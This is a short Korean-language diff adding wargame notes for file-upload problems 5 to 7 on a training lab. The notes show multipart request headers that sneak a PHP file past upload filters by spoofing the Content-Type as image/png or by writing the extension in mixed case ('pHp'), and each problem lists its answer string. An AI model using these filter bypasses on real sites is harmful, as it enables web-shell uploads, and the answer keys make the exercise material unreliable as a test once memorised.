@@ -1,0 +1,45 @@
+================================
+* 파일 업로드 워게임 문제 5번
+================================
+
+1. 다운로드 URL 
+
+https://lab.eqst.co.kr:8083/exam34/process/faqboardProcess.php
+{"result":"S","answer":"contenttype"}
+------WebKitFormBoundaryFDl5Y1mR2As77X4l
+Content-Disposition: form-data; name="fileupload"; filename="hey.php"
+Content-Type: image/png
+
+type,filename을 바꾸어 해결함.
+2. 정답
+contenttype
+================================
+================================
+* 파일 업로드 워게임 문제 6번
+================================
+
+1. 다운로드 URL 
+
+------WebKitFormBoundaryFDl5Y1mR2As77X4l
+Content-Disposition: form-data; name="fileupload"; filename="hey.php"
+Content-Type: image/png
+
+filename, type을 바꾸어 해결함
+2. 정답
+server_upload
+================================
+================================
+* 파일 업로드 워게임 문제 7번
+================================
+
+1. 다운로드 URL 
+
+-----WebKitFormBoundaryWPZmF7UbDfVMG53e
+Content-Disposition: form-data; name="fileupload"; filename="hey.pHp"
+Content-Type: image/png
+
+php 대소문자 구분이 안되어있음.
+
+2. 정답
+lower_upload
+================================
